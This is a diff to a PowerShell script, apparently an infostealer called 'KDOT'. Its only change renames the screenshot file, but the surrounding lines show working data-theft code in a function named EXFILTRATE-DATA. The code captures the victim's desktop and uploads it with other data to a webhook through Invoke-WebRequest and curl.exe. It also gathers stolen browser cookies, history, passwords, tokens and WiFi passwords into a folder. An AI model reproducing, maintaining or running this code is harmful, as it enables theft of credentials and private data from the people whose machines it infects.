@@ -72,7 +72,7 @@ function EXFILTRATE-DATA {
     $bmp      = New-Object System.Drawing.Bitmap ([int]$bounds.width), ([int]$bounds.height)
     $graphics = [Drawing.Graphics]::FromImage($bmp)
     $graphics.CopyFromScreen($bounds.Location, [Drawing.Point]::Empty, $bounds.size)
-    $bmp.Save("$env:localappdata\temp\screenshot.png")
+    $bmp.Save("$env:localappdata\temp\desktop-screenshot.png")
     $graphics.Dispose()
     $bmp.Dispose()
     
@@ -131,7 +131,7 @@ function EXFILTRATE-DATA {
     Invoke-WebRequest -Uri $webhook -Method POST -Body $payload -ContentType "application/json" -UseBasicParsing | Out-Null
 	
 	# Screenshot Embed
-	curl.exe -F "payload_json={\`"username\`": \`"KDOT\`", \`"content\`": \`":hamsa: **Screenshot**\`"}" -F "file=@\`"$env:localappdata\temp\screenshot.png\`"" $webhook | out-null
+	curl.exe -F "payload_json={\`"username\`": \`"KDOT\`", \`"content\`": \`":hamsa: **Screenshot**\`"}" -F "file=@\`"$env:localappdata\temp\desktop-screenshot.png\`"" $webhook | out-null
 
     Set-Location $env:LOCALAPPDATA\Temp
 
@@ -164,7 +164,7 @@ function EXFILTRATE-DATA {
     Move-Item -Path "$extracted\browser-cookies.txt" -Destination "$extracted\KDOT\browser-cookies.txt" -ErrorAction SilentlyContinue
     Move-Item -Path "$extracted\browser-history.txt" -Destination "$extracted\KDOT\browser-history.txt" -ErrorAction SilentlyContinue
     Move-Item -Path "$extracted\browser-passwords.txt" -Destination "$extracted\KDOT\browser-passwords.txt" -ErrorAction SilentlyContinue
-    Move-Item -Path "$extracted\screenshot.png" -Destination "$extracted\KDOT\screenshot.png" -ErrorAction SilentlyContinue
+    Move-Item -Path "$extracted\desktop-screenshot.png" -Destination "$extracted\KDOT\desktop-screenshot.png" -ErrorAction SilentlyContinue
     Move-Item -Path "$extracted\tokens.txt" -Destination "$extracted\KDOT\tokens.txt" -ErrorAction SilentlyContinue
     Move-Item -Path "$extracted\WIFIPasswords.txt" -Destination "$extracted\KDOT\WIFIPasswords.txt" -ErrorAction SilentlyContinue
     Move-Item -Path "$extracted\GPU.txt" -Destination "$extracted\KDOT\GPU.txt" -ErrorAction SilentlyContinue
